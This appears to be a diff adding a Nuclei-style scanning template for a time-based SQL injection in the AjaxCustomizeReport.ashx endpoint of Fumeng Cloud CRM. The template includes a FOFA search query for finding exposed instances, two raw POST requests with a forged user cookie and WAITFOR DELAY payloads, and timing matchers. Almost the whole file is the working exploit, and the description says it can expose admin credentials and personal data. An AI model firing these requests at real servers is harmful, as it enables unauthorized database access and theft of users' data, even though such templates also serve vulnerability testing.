@@ -1,0 +1,31 @@
+id: fumengyun-crm-ajaxcustomizereport-ashx-sql-injection
+info:
+  name: 孚盟云CRM AjaxCustomizeReport.ashx SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="孚盟软件-孚盟云"
+    上海孚盟软件有限公司专注于外贸SaaS服务及行业解决方案。其孚盟云产品中AjaxCustomizeReport.ashx接口存在SQL注入漏洞，攻击者可通过构造恶意SQL语句实现数据库信息检索，包括敏感数据如管理员凭证及用户个人信息。在特定权限条件下，可能进一步执行服务器端代码植入，导致系统权限被完全控制。
+  tags: 孚盟云CRM
+http:
+- raw:
+  - |
+    POST /m/Dingding/Ajax/AjaxCustomizeReport.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: UserCookie={"empId":"1"}
+    Content-Type: application/x-www-form-urlencoded
+
+    action=GetMouldList&searchTxt='WAITFOR DELAY'0:0:5'--
+  - |
+    POST /m/Dingding/Ajax/AjaxCustomizeReport.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: UserCookie={"empId":"1"}
+    Content-Type: application/x-www-form-urlencoded
+
+    action=GetMouldList&searchTxt='WAITFOR DELAY'0:0:8'--
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
